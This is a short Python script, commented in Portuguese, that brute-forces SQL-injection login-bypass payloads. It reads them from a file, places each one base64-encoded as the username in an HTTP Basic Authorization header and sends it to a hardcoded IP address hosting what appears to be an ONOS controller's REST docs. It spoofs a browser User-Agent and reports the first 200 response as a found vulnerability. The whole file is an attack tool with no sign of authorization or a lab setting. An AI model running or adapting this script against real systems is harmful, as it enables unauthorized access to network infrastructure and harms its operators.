import requests
import base64
import logging

# Configuração do logger para registrar os resultados
logging.basicConfig(
    filename="sql_injection_results.log",  # Arquivo onde os logs serão armazenados
    level=logging.DEBUG,                   # Nível de log (INFO para capturar mensagens de sucesso e erro)
    format="%(asctime)s - %(levelname)s - %(message)s",  # Formato do log
)

# URL do serviço alvo
url = "http://34.139.11.27:8181/onos/v1/docs/index.html"
payloads_file_path = './sql_payloads/msql-injection-login-bypass.txt'  # Caminho do arquivo de payloads

# Função para ler os payloads do arquivo
def read_payloads():
    try:
        # Abre o arquivo e lê cada linha, removendo espaços extras
        with open(payloads_file_path, 'r', encoding='ISO-8859-1') as file:
            return [line.strip() for line in file if line.strip()]  # Retorna uma lista de payloads não vazios
    except FileNotFoundError:
        # Caso o arquivo não seja encontrado, loga o erro
        logging.error("Arquivo de payloads não encontrado.")
        return []

# Função para codificar as credenciais em base64 (para autenticação Basic)
def encode_credentials(username: str, password: str):
    credentials = f"{username}:{password}"  # Formata as credenciais como 'username:password'
    return base64.b64encode(credentials.encode('ISO-8859-1')).decode("ISO-8859-1")  # Codifica as credenciais em base64

# Função para testar a vulnerabilidade de SQL Injection
def test_sql_injection(username):
    # Cabeçalhos da requisição, incluindo a autorização básica com as credenciais codificadas
    headers = {
        "Authorization": f"Basic {encode_credentials(username=username, password='test')}",  # Codificação de autorização
        "User-Agent": "Mozilla/5.0",  # Definindo o agente de usuário para imitar um navegador
    }
    try:
        # Realiza a requisição GET com o payload como parte da autorização
        response = requests.get(url, headers=headers, timeout=5)
        return response  # Retorna a resposta da requisição
    except requests.exceptions.RequestException as e:
        # Caso ocorra erro na requisição, loga o erro
        logging.error(f"Erro na requisição com payload '{username}': {e}")
        return None

# Função principal
def main():
    sql_payloads = read_payloads()  # Lê os payloads do arquivo
    if not sql_payloads:
        # Se não houver payloads, imprime uma mensagem de erro e termina a execução
        print("Nenhum payload encontrado. Verifique o arquivo.")
        return
    
    # Itera sobre cada payload e testa a vulnerabilidade
    for payload in sql_payloads:
        response = test_sql_injection(payload)  # Testa a SQL Injection com o payload atual
        
        if response and response.status_code == 200:
            # Se o status da resposta for 200 (OK), significa que a vulnerabilidade foi encontrada
            print(f"[SUCCESS] Vulnerabilidade possivelmente identificada com payload: {payload}")
            logging.info(f'[SUCCESS] Vulnerabilidade possivelmente identificada com payload: {payload} | Status Code: {response.status_code} ')

            break  # Interrompe o loop após encontrar a vulnerabilidade
        else:
            # Caso contrário, loga a falha e continua com o próximo payload
            logging.debug(f"Falha com payload: '{payload}' - Status: {response.status_code if response else 'Sem resposta'}")
            print(f"[FAILED] Sem sucesso com payload: '{payload}'")

# Verifica se o script está sendo executado diretamente e chama a função main
if __name__ == '__main__':
    main()
